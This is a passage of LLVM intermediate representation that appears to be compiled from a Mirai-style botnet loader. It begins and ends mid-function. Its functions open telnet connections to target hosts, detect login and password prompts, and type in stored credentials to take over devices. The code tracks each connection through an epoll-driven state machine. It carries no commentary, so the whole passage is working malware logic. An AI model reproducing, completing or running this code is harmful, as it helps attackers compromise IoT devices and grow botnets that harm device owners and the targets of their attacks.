  %160 = call i32 (i32, ...) bitcast (i32 (...)* @sleep to i32 (i32, ...)*)(i32 1)
  br label %9
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @server_destroy(%struct.server* %0) #0 {
  %2 = alloca %struct.server*, align 8
  store %struct.server* %0, %struct.server** %2, align 8
  %3 = load %struct.server*, %struct.server** %2, align 8
  %4 = icmp eq %struct.server* %3, null
  br i1 %4, label %5, label %6

5:                                                ; preds = %1
  br label %29

6:                                                ; preds = %1
  %7 = load %struct.server*, %struct.server** %2, align 8
  %8 = getelementptr inbounds %struct.server, %struct.server* %7, i32 0, i32 13
  %9 = load i32*, i32** %8, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %16

11:                                               ; preds = %6
  %12 = load %struct.server*, %struct.server** %2, align 8
  %13 = getelementptr inbounds %struct.server, %struct.server* %12, i32 0, i32 13
  %14 = load i32*, i32** %13, align 8
  %15 = bitcast i32* %14 to i8*
  call void @free(i8* %15) #8
  br label %16

16:                                               ; preds = %11, %6
  %17 = load %struct.server*, %struct.server** %2, align 8
  %18 = getelementptr inbounds %struct.server, %struct.server* %17, i32 0, i32 11
  %19 = load %struct.server_worker*, %struct.server_worker** %18, align 8
  %20 = icmp ne %struct.server_worker* %19, null
  br i1 %20, label %21, label %26

21:                                               ; preds = %16
  %22 = load %struct.server*, %struct.server** %2, align 8
  %23 = getelementptr inbounds %struct.server, %struct.server* %22, i32 0, i32 11
  %24 = load %struct.server_worker*, %struct.server_worker** %23, align 8
  %25 = bitcast %struct.server_worker* %24 to i8*
  call void @free(i8* %25) #8
  br label %26

26:                                               ; preds = %21, %16
  %27 = load %struct.server*, %struct.server** %2, align 8
  %28 = bitcast %struct.server* %27 to i8*
  call void @free(i8* %28) #8
  br label %29

29:                                               ; preds = %26, %5
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @server_queue_telnet(%struct.server* %0, %struct.telnet_info* %1) #0 {
  %3 = alloca %struct.server*, align 8
  %4 = alloca %struct.telnet_info*, align 8
  store %struct.server* %0, %struct.server** %3, align 8
  store %struct.telnet_info* %1, %struct.telnet_info** %4, align 8
  br label %5

5:                                                ; preds = %13, %2
  %6 = load %struct.server*, %struct.server** %3, align 8
  %7 = getelementptr inbounds %struct.server, %struct.server* %6, i32 0, i32 1
  %8 = atomicrmw add i32* %7, i32 0 seq_cst, align 4
  %9 = load %struct.server*, %struct.server** %3, align 8
  %10 = getelementptr inbounds %struct.server, %struct.server* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = icmp uge i32 %8, %11
  br i1 %12, label %13, label %15

13:                                               ; preds = %5
  %14 = call i32 (i32, ...) bitcast (i32 (...)* @sleep to i32 (i32, ...)*)(i32 1)
  br label %5, !llvm.loop !11

15:                                               ; preds = %5
  %16 = load %struct.server*, %struct.server** %3, align 8
  %17 = getelementptr inbounds %struct.server, %struct.server* %16, i32 0, i32 1
  %18 = atomicrmw add i32* %17, i32 1 seq_cst, align 4
  %19 = load %struct.server*, %struct.server** %3, align 8
  %20 = icmp eq %struct.server* %19, null
  br i1 %20, label %21, label %22

21:                                               ; preds = %15
  br label %22

22:                                               ; preds = %21, %15
  %23 = load %struct.server*, %struct.server** %3, align 8
  %24 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  call void @server_telnet_probe(%struct.server* %23, %struct.telnet_info* %24)
  ret void
}

declare i32 @sleep(...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @server_telnet_probe(%struct.server* %0, %struct.telnet_info* %1) #0 {
  %3 = alloca %struct.server*, align 8
  %4 = alloca %struct.telnet_info*, align 8
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.connection*, align 8
  %8 = alloca %struct.epoll_event, align 1
  %9 = alloca i32, align 4
  %10 = alloca %struct.server_worker*, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.server* %0, %struct.server** %3, align 8
  store %struct.telnet_info* %1, %struct.telnet_info** %4, align 8
  %12 = load %struct.server*, %struct.server** %3, align 8
  %13 = call i32 @util_socket_and_bind(%struct.server* %12)
  store i32 %13, i32* %5, align 4
  store i32 0, i32* %9, align 4
  %14 = load %struct.server*, %struct.server** %3, align 8
  %15 = getelementptr inbounds %struct.server, %struct.server* %14, i32 0, i32 11
  %16 = load %struct.server_worker*, %struct.server_worker** %15, align 8
  %17 = load %struct.server*, %struct.server** %3, align 8
  %18 = getelementptr inbounds %struct.server, %struct.server* %17, i32 0, i32 18
  %19 = atomicrmw add i32* %18, i32 1 seq_cst, align 4
  %20 = load %struct.server*, %struct.server** %3, align 8
  %21 = getelementptr inbounds %struct.server, %struct.server* %20, i32 0, i32 16
  %22 = load i8, i8* %21, align 2
  %23 = zext i8 %22 to i32
  %24 = srem i32 %19, %23
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %16, i64 %25
  store %struct.server_worker* %26, %struct.server_worker** %10, align 8
  %27 = load i32, i32* %5, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %38

29:                                               ; preds = %2
  %30 = call i64 @time(i64* null) #8
  %31 = srem i64 %30, 10
  %32 = icmp eq i64 %31, 0
  br i1 %32, label %33, label %34

33:                                               ; preds = %29
  br label %34

34:                                               ; preds = %33, %29
  %35 = load %struct.server*, %struct.server** %3, align 8
  %36 = getelementptr inbounds %struct.server, %struct.server* %35, i32 0, i32 1
  %37 = atomicrmw sub i32* %36, i32 1 seq_cst, align 4
  br label %111

38:                                               ; preds = %2
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = load %struct.server*, %struct.server** %3, align 8
  %42 = getelementptr inbounds %struct.server, %struct.server* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 8
  %44 = mul i32 %43, 2
  %45 = icmp uge i32 %40, %44
  br i1 %45, label %46, label %51

46:                                               ; preds = %39
  %47 = load i32, i32* %5, align 4
  %48 = load %struct.connection*, %struct.connection** %7, align 8
  %49 = getelementptr inbounds %struct.connection, %struct.connection* %48, i32 0, i32 4
  store i32 %47, i32* %49, align 8
  %50 = load %struct.connection*, %struct.connection** %7, align 8
  call void @connection_close(%struct.connection* %50)
  br label %111

51:                                               ; preds = %39
  %52 = load %struct.server*, %struct.server** %3, align 8
  %53 = icmp eq %struct.server* %52, null
  br i1 %53, label %54, label %55

54:                                               ; preds = %51
  br label %55

55:                                               ; preds = %54, %51
  %56 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %57 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %56, i32 0, i32 2
  %58 = getelementptr inbounds [6 x i8], [6 x i8]* %57, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %58, i8 0, i64 6, i1 false)
  %59 = load %struct.server*, %struct.server** %3, align 8
  %60 = getelementptr inbounds %struct.server, %struct.server* %59, i32 0, i32 12
  %61 = load %struct.connection**, %struct.connection*** %60, align 8
  %62 = load i32, i32* %5, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.connection*, %struct.connection** %61, i64 %63
  %65 = load %struct.connection*, %struct.connection** %64, align 8
  store %struct.connection* %65, %struct.connection** %7, align 8
  %66 = load %struct.connection*, %struct.connection** %7, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 3
  %68 = bitcast %struct.telnet_info* %67 to i8*
  %69 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %70 = bitcast %struct.telnet_info* %69 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %68, i8* align 4 %70, i64 120, i1 false)
  %71 = load %struct.server*, %struct.server** %3, align 8
  %72 = load %struct.connection*, %struct.connection** %7, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 1
  store %struct.server* %71, %struct.server** %73, align 8
  %74 = load i32, i32* %5, align 4
  %75 = load %struct.connection*, %struct.connection** %7, align 8
  %76 = getelementptr inbounds %struct.connection, %struct.connection* %75, i32 0, i32 4
  store i32 %74, i32* %76, align 8
  %77 = load %struct.connection*, %struct.connection** %7, align 8
  call void @connection_open(%struct.connection* %77)
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %78, align 4
  %79 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %80 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %79, i32 0, i32 4
  %81 = load i32, i32* %80, align 4
  %82 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %83 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %82, i32 0, i32 0
  store i32 %81, i32* %83, align 4
  %84 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %85 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %84, i32 0, i32 5
  %86 = load i16, i16* %85, align 4
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %86, i16* %87, align 2
  %88 = load i32, i32* %5, align 4
  %89 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %90 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  store %struct.sockaddr* %90, %struct.sockaddr** %89, align 8
  %91 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %92 = load %struct.sockaddr*, %struct.sockaddr** %91, align 8
  %93 = call i32 @connect(i32 %88, %struct.sockaddr* %92, i32 16)
  store i32 %93, i32* %9, align 4
  %94 = load i32, i32* %9, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %101

96:                                               ; preds = %55
  %97 = call i32* @__errno_location() #11
  %98 = load i32, i32* %97, align 4
  %99 = icmp ne i32 %98, 115
  br i1 %99, label %100, label %101

100:                                              ; preds = %96
  br label %101

101:                                              ; preds = %100, %96, %55
  %102 = load i32, i32* %5, align 4
  %103 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 1
  %104 = bitcast %union.epoll_data* %103 to i32*
  store i32 %102, i32* %104, align 1
  %105 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 0
  store i32 4, i32* %105, align 1
  %106 = load %struct.server_worker*, %struct.server_worker** %10, align 8
  %107 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %106, i32 0, i32 1
  %108 = load i32, i32* %107, align 8
  %109 = load i32, i32* %5, align 4
  %110 = call i32 @epoll_ctl(i32 %108, i32 1, i32 %109, %struct.epoll_event* %8) #8
  br label %111

111:                                              ; preds = %101, %46, %34
  ret void
}

declare i32 @util_socket_and_bind(%struct.server*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare void @connection_close(%struct.connection*) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #5

declare void @connection_open(%struct.connection*) #3

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @bind_core(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca %struct.cpu_set_t, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %7 = call i64 @pthread_self() #11
  store i64 %7, i64* %3, align 8
  br label %8

8:                                                ; preds = %1
  %9 = bitcast %struct.cpu_set_t* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %9, i8 0, i64 128, i1 false)
  br label %10

10:                                               ; preds = %8
  %11 = load i32, i32* %2, align 4
  %12 = sext i32 %11 to i64
  store i64 %12, i64* %5, align 8
  %13 = load i64, i64* %5, align 8
  %14 = udiv i64 %13, 8
  %15 = icmp ult i64 %14, 128
  br i1 %15, label %16, label %27

16:                                               ; preds = %10
  %17 = load i64, i64* %5, align 8
  %18 = urem i64 %17, 64
  %19 = shl i64 1, %18
  %20 = getelementptr inbounds %struct.cpu_set_t, %struct.cpu_set_t* %4, i32 0, i32 0
  %21 = getelementptr inbounds [16 x i64], [16 x i64]* %20, i64 0, i64 0
  %22 = load i64, i64* %5, align 8
  %23 = udiv i64 %22, 64
  %24 = getelementptr inbounds i64, i64* %21, i64 %23
  %25 = load i64, i64* %24, align 8
  %26 = or i64 %25, %19
  store i64 %26, i64* %24, align 8
  br label %28

27:                                               ; preds = %10
  br label %28

28:                                               ; preds = %27, %16
  %29 = phi i64 [ %26, %16 ], [ 0, %27 ]
  store i64 %29, i64* %6, align 8
  %30 = load i64, i64* %6, align 8
  %31 = load i64, i64* %3, align 8
  %32 = call i32 @pthread_setaffinity_np(i64 %31, i64 128, %struct.cpu_set_t* %4) #8
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %28
  br label %35

35:                                               ; preds = %34, %28
  ret void
}

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #3

declare void @perror(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @handle_event(%struct.server_worker* %0, %struct.epoll_event* %1) #0 {
  %3 = alloca %struct.server_worker*, align 8
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca %struct.connection*, align 8
  %7 = alloca %struct.epoll_event, align 1
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.binary*, align 8
  %13 = alloca i32, align 4
  store %struct.server_worker* %0, %struct.server_worker** %3, align 8
  store %struct.epoll_event* %1, %struct.epoll_event** %4, align 8
  store i32 0, i32* %5, align 4
  %14 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %15 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %14, i32 0, i32 0
  %16 = load %struct.server*, %struct.server** %15, align 8
  %17 = getelementptr inbounds %struct.server, %struct.server* %16, i32 0, i32 12
  %18 = load %struct.connection**, %struct.connection*** %17, align 8
  %19 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %20 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %19, i32 0, i32 1
  %21 = bitcast %union.epoll_data* %20 to i32*
  %22 = load i32, i32* %21, align 1
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.connection*, %struct.connection** %18, i64 %23
  %25 = load %struct.connection*, %struct.connection** %24, align 8
  store %struct.connection* %25, %struct.connection** %6, align 8
  %26 = load %struct.connection*, %struct.connection** %6, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 4
  %28 = load i32, i32* %27, align 8
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %30, label %38

30:                                               ; preds = %2
  %31 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %32 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %31, i32 0, i32 1
  %33 = bitcast %union.epoll_data* %32 to i32*
  %34 = load i32, i32* %33, align 1
  %35 = load %struct.connection*, %struct.connection** %6, align 8
  %36 = getelementptr inbounds %struct.connection, %struct.connection* %35, i32 0, i32 4
  store i32 %34, i32* %36, align 8
  %37 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %37)
  br label %821

38:                                               ; preds = %2
  %39 = load %struct.connection*, %struct.connection** %6, align 8
  %40 = getelementptr inbounds %struct.connection, %struct.connection* %39, i32 0, i32 4
  %41 = load i32, i32* %40, align 8
  %42 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %43 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %42, i32 0, i32 1
  %44 = bitcast %union.epoll_data* %43 to i32*
  %45 = load i32, i32* %44, align 1
  %46 = icmp ne i32 %41, %45
  br i1 %46, label %47, label %68

47:                                               ; preds = %38
  %48 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 1
  %51 = and i32 %50, 8
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %65, label %53

53:                                               ; preds = %47
  %54 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %55 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 1
  %57 = and i32 %56, 16
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %65, label %59

59:                                               ; preds = %53
  %60 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 1
  %63 = and i32 %62, 8192
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %67

65:                                               ; preds = %59, %53, %47
  %66 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %66)
  br label %821

67:                                               ; preds = %59
  br label %68

68:                                               ; preds = %67, %38
  %69 = load %struct.connection*, %struct.connection** %6, align 8
  %70 = getelementptr inbounds %struct.connection, %struct.connection* %69, i32 0, i32 10
  %71 = load i32, i32* %70, align 8
  %72 = icmp eq i32 %71, 1
  br i1 %72, label %73, label %107

73:                                               ; preds = %68
  %74 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %75 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %74, i32 0, i32 0
  %76 = load i32, i32* %75, align 1
  %77 = and i32 %76, 4
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %79, label %107

79:                                               ; preds = %73
  store i32 0, i32* %8, align 4
  store i32 4, i32* %9, align 4
  %80 = load %struct.connection*, %struct.connection** %6, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 4
  %82 = load i32, i32* %81, align 8
  %83 = bitcast i32* %8 to i8*
  %84 = call i32 @getsockopt(i32 %82, i32 1, i32 4, i8* %83, i32* %9) #8
  %85 = load i32, i32* %8, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %89

87:                                               ; preds = %79
  %88 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %88)
  br label %821

89:                                               ; preds = %79
  %90 = load %struct.connection*, %struct.connection** %6, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 4
  %92 = load i32, i32* %91, align 8
  %93 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i32 0, i32 1
  %94 = bitcast %union.epoll_data* %93 to i32*
  store i32 %92, i32* %94, align 1
  %95 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i32 0, i32 0
  store i32 -2147483647, i32* %95, align 1
  %96 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %97 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %96, i32 0, i32 1
  %98 = load i32, i32* %97, align 8
  %99 = load %struct.connection*, %struct.connection** %6, align 8
  %100 = getelementptr inbounds %struct.connection, %struct.connection* %99, i32 0, i32 4
  %101 = load i32, i32* %100, align 8
  %102 = call i32 @epoll_ctl(i32 %98, i32 3, i32 %101, %struct.epoll_event* %7) #8
  %103 = load %struct.connection*, %struct.connection** %6, align 8
  %104 = getelementptr inbounds %struct.connection, %struct.connection* %103, i32 0, i32 10
  store i32 2, i32* %104, align 8
  %105 = load %struct.connection*, %struct.connection** %6, align 8
  %106 = getelementptr inbounds %struct.connection, %struct.connection* %105, i32 0, i32 13
  store i16 45, i16* %106, align 2
  br label %107

107:                                              ; preds = %89, %73, %68
  %108 = load %struct.connection*, %struct.connection** %6, align 8
  %109 = getelementptr inbounds %struct.connection, %struct.connection* %108, i32 0, i32 14
  %110 = load i8, i8* %109, align 4
  %111 = icmp ne i8 %110, 0
  br i1 %111, label %113, label %112

112:                                              ; preds = %107
  br label %113

113:                                              ; preds = %112, %107
  %114 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %115 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %114, i32 0, i32 0
  %116 = load i32, i32* %115, align 1
  %117 = and i32 %116, 1
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %119, label %821

119:                                              ; preds = %113
  %120 = load %struct.connection*, %struct.connection** %6, align 8
  %121 = getelementptr inbounds %struct.connection, %struct.connection* %120, i32 0, i32 14
  %122 = load i8, i8* %121, align 4
  %123 = sext i8 %122 to i32
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %125, label %821

125:                                              ; preds = %119
  store i32 0, i32* %10, align 4
  %126 = call i64 @time(i64* null) #8
  %127 = load %struct.connection*, %struct.connection** %6, align 8
  %128 = getelementptr inbounds %struct.connection, %struct.connection* %127, i32 0, i32 9
  store i64 %126, i64* %128, align 8
  br label %129

129:                                              ; preds = %125, %819
  %130 = load %struct.connection*, %struct.connection** %6, align 8
  %131 = getelementptr inbounds %struct.connection, %struct.connection* %130, i32 0, i32 4
  %132 = load i32, i32* %131, align 8
  %133 = load %struct.connection*, %struct.connection** %6, align 8
  %134 = getelementptr inbounds %struct.connection, %struct.connection* %133, i32 0, i32 18
  %135 = getelementptr inbounds [8192 x i8], [8192 x i8]* %134, i64 0, i64 0
  %136 = load %struct.connection*, %struct.connection** %6, align 8
  %137 = getelementptr inbounds %struct.connection, %struct.connection* %136, i32 0, i32 12
  %138 = load i16, i16* %137, align 8
  %139 = zext i16 %138 to i32
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds i8, i8* %135, i64 %140
  %142 = load %struct.connection*, %struct.connection** %6, align 8
  %143 = getelementptr inbounds %struct.connection, %struct.connection* %142, i32 0, i32 12
  %144 = load i16, i16* %143, align 8
  %145 = zext i16 %144 to i64
  %146 = sub i64 8192, %145
  %147 = call i64 @recv(i32 %132, i8* %141, i64 %146, i32 16384)
  %148 = trunc i64 %147 to i32
  store i32 %148, i32* %10, align 4
  %149 = load i32, i32* %10, align 4
  %150 = icmp sle i32 %149, 0
  br i1 %150, label %151, label %162

151:                                              ; preds = %129
  %152 = call i32* @__errno_location() #11
  %153 = load i32, i32* %152, align 4
  %154 = icmp ne i32 %153, 11
  br i1 %154, label %155, label %161

155:                                              ; preds = %151
  %156 = call i32* @__errno_location() #11
  %157 = load i32, i32* %156, align 4
  %158 = icmp ne i32 %157, 11
  br i1 %158, label %159, label %161

159:                                              ; preds = %155
  %160 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %160)
  br label %161

161:                                              ; preds = %159, %155, %151
  br label %820

162:                                              ; preds = %129
  %163 = load i32, i32* %10, align 4
  %164 = load %struct.connection*, %struct.connection** %6, align 8
  %165 = getelementptr inbounds %struct.connection, %struct.connection* %164, i32 0, i32 12
  %166 = load i16, i16* %165, align 8
  %167 = zext i16 %166 to i32
  %168 = add nsw i32 %167, %163
  %169 = trunc i32 %168 to i16
  store i16 %169, i16* %165, align 8
  %170 = call i64 @time(i64* null) #8
  %171 = load %struct.connection*, %struct.connection** %6, align 8
  %172 = getelementptr inbounds %struct.connection, %struct.connection* %171, i32 0, i32 9
  store i64 %170, i64* %172, align 8
  %173 = load %struct.connection*, %struct.connection** %6, align 8
  %174 = getelementptr inbounds %struct.connection, %struct.connection* %173, i32 0, i32 12
  %175 = load i16, i16* %174, align 8
  %176 = zext i16 %175 to i32
  %177 = icmp sgt i32 %176, 8196
  br i1 %177, label %178, label %179

178:                                              ; preds = %162
  call void @abort() #9
  unreachable

179:                                              ; preds = %162
  br label %180

180:                                              ; preds = %179, %818
  store i32 0, i32* %11, align 4
  %181 = load %struct.connection*, %struct.connection** %6, align 8
  %182 = getelementptr inbounds %struct.connection, %struct.connection* %181, i32 0, i32 10
  %183 = load i32, i32* %182, align 8
  switch i32 %183, label %766 [
    i32 2, label %184
    i32 3, label %193
    i32 4, label %221
    i32 5, label %249
    i32 9, label %278
    i32 10, label %311
    i32 11, label %346
    i32 12, label %394
    i32 13, label %425
    i32 14, label %488
    i32 15, label %526
    i32 16, label %580
    i32 17, label %634
    i32 18, label %756
  ]

184:                                              ; preds = %180
  %185 = load %struct.connection*, %struct.connection** %6, align 8
  %186 = call i32 @connection_consume_iacs(%struct.connection* %185)
  store i32 %186, i32* %11, align 4
  %187 = load i32, i32* %11, align 4
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %189, label %192

189:                                              ; preds = %184
  %190 = load %struct.connection*, %struct.connection** %6, align 8
  %191 = getelementptr inbounds %struct.connection, %struct.connection* %190, i32 0, i32 10
  store i32 3, i32* %191, align 8
  br label %192

192:                                              ; preds = %189, %184
  br label %767

193:                                              ; preds = %180
  %194 = load %struct.connection*, %struct.connection** %6, align 8
  %195 = call i32 @connection_consume_login_prompt(%struct.connection* %194)
  store i32 %195, i32* %11, align 4
  %196 = load i32, i32* %11, align 4
  %197 = icmp ne i32 %196, 0
  br i1 %197, label %198, label %220

198:                                              ; preds = %193
  %199 = load %struct.connection*, %struct.connection** %6, align 8
  %200 = getelementptr inbounds %struct.connection, %struct.connection* %199, i32 0, i32 4
  %201 = load i32, i32* %200, align 8
  %202 = load %struct.connection*, %struct.connection** %6, align 8
  %203 = getelementptr inbounds %struct.connection, %struct.connection* %202, i32 0, i32 3
  %204 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %203, i32 0, i32 0
  %205 = getelementptr inbounds [32 x i8], [32 x i8]* %204, i64 0, i64 0
  %206 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %201, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i8* %205)
  %207 = load %struct.connection*, %struct.connection** %6, align 8
  %208 = getelementptr inbounds %struct.connection, %struct.connection* %207, i32 0, i32 11
  %209 = getelementptr inbounds %struct.anon, %struct.anon* %208, i32 0, i32 0
  %210 = getelementptr inbounds [512 x i8], [512 x i8]* %209, i64 0, i64 0
  %211 = call i8* @strcpy(i8* %210, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0)) #8
  %212 = call i64 @time(i64* null) #8
  %213 = add nsw i64 %212, 1
  %214 = trunc i64 %213 to i32
  %215 = load %struct.connection*, %struct.connection** %6, align 8
  %216 = getelementptr inbounds %struct.connection, %struct.connection* %215, i32 0, i32 11
  %217 = getelementptr inbounds %struct.anon, %struct.anon* %216, i32 0, i32 1
  store i32 %214, i32* %217, align 4
  %218 = load %struct.connection*, %struct.connection** %6, align 8
  %219 = getelementptr inbounds %struct.connection, %struct.connection* %218, i32 0, i32 10
  store i32 4, i32* %219, align 8
  br label %220

220:                                              ; preds = %198, %193
  br label %767

221:                                              ; preds = %180
  %222 = load %struct.connection*, %struct.connection** %6, align 8
  %223 = call i32 @connection_consume_password_prompt(%struct.connection* %222)
  store i32 %223, i32* %11, align 4
  %224 = load i32, i32* %11, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %248

226:                                              ; preds = %221
  %227 = load %struct.connection*, %struct.connection** %6, align 8
  %228 = getelementptr inbounds %struct.connection, %struct.connection* %227, i32 0, i32 4
  %229 = load i32, i32* %228, align 8
  %230 = load %struct.connection*, %struct.connection** %6, align 8
  %231 = getelementptr inbounds %struct.connection, %struct.connection* %230, i32 0, i32 3
  %232 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %231, i32 0, i32 1
  %233 = getelementptr inbounds [32 x i8], [32 x i8]* %232, i64 0, i64 0
  %234 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %229, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i8* %233)
  %235 = load %struct.connection*, %struct.connection** %6, align 8
  %236 = getelementptr inbounds %struct.connection, %struct.connection* %235, i32 0, i32 11
  %237 = getelementptr inbounds %struct.anon, %struct.anon* %236, i32 0, i32 0
  %238 = getelementptr inbounds [512 x i8], [512 x i8]* %237, i64 0, i64 0
  %239 = call i8* @strcpy(i8* %238, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.16, i64 0, i64 0)) #8
  %240 = call i64 @time(i64* null) #8
  %241 = add nsw i64 %240, 1
  %242 = trunc i64 %241 to i32
  %243 = load %struct.connection*, %struct.connection** %6, align 8
  %244 = getelementptr inbounds %struct.connection, %struct.connection* %243, i32 0, i32 11
  %245 = getelementptr inbounds %struct.anon, %struct.anon* %244, i32 0, i32 1
  store i32 %242, i32* %245, align 4
  %246 = load %struct.connection*, %struct.connection** %6, align 8
  %247 = getelementptr inbounds %struct.connection, %struct.connection* %246, i32 0, i32 10
  store i32 5, i32* %247, align 8
  br label %248

248:                                              ; preds = %226, %221
  br label %767

249:                                              ; preds = %180
  %250 = load %struct.connection*, %struct.connection** %6, align 8
  %251 = call i32 @connection_consume_prompt(%struct.connection* %250)
  store i32 %251, i32* %11, align 4
  %252 = icmp sgt i32 %251, 0
  br i1 %252, label %253, label %277

253:                                              ; preds = %249
  %254 = load %struct.connection*, %struct.connection** %6, align 8
  %255 = getelementptr inbounds %struct.connection, %struct.connection* %254, i32 0, i32 4
  %256 = load i32, i32* %255, align 8
